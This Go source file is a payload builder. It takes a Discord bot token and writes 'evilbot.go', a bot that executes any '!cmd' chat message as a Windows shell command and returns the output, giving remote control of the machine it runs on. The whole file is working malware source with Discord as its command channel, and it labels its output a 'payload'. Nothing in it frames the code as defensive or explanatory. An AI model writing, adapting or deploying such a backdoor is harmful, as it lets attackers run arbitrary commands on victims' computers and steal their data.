package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
)

func main() {
	// Define flags for input
	token := flag.String("token", "", "Discord bot token")
	outputFile := flag.String("w", "evilbot.go", "Output file to write the bot code")

	// Parse command-line flags
	flag.Parse()

	// Ensure token is provided
	if *token == "" {
		log.Fatal("Error: Bot token is required. Use -token <bot_token>")
	}

	// Template for the generated bot code
	botCode := fmt.Sprintf(`package main

import (
	"fmt"
	"os/exec"
	"strings"

	"github.com/bwmarrin/discordgo"
)

var token = "%s" // Bot token

func main() {
	// Create a new Discord session using the provided bot token
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("error creating Discord session:", err)
		return
	}

	// Register the messageCreate function to handle messages
	dg.AddHandler(messageCreate)

	// Open the WebSocket connection to Discord
	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection:", err)
		return
	}

	// Wait for the bot to be terminated
	fmt.Println("Bot is now running. Press CTRL+C to exit.")
	select {}
}

// messageCreate is called when a new message is sent in a channel
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore messages sent by the bot itself
	if m.Author.ID == s.State.User.ID {
		return
	}

	// Listen for the !cmd command
	if strings.HasPrefix(m.Content, "!cmd") {
		cmdStr := strings.TrimPrefix(m.Content, "!cmd ")
		output, err := executeCommand(cmdStr)
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error: %s", err))
		} else {
			// Send the output of the command inside a Markdown code block
			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Command Output: \n```%s```", output))
		}
	}
}

// executeCommand runs a system command and returns the output
func executeCommand(cmd string) (string, error) {
	// Create the command object
	command := exec.Command("cmd", "/C", cmd)

	// Get the command output
	output, err := command.CombinedOutput()
	if err != nil {
		// If there was an error, return the error message
		return "", fmt.Errorf("failed to execute command: %v", err)
	}

	// Return the output as a string
	return string(output), nil
}
`, *token)

	// Create the output file and write the bot code to it
	err := ioutil.WriteFile(*outputFile, []byte(botCode), 0644)
	if err != nil {
		log.Fatalf("Failed to write to file %s: %v", *outputFile, err)
	}

	// Confirm that the file was created
	fmt.Printf("Payload written to %s\n", *outputFile)
}
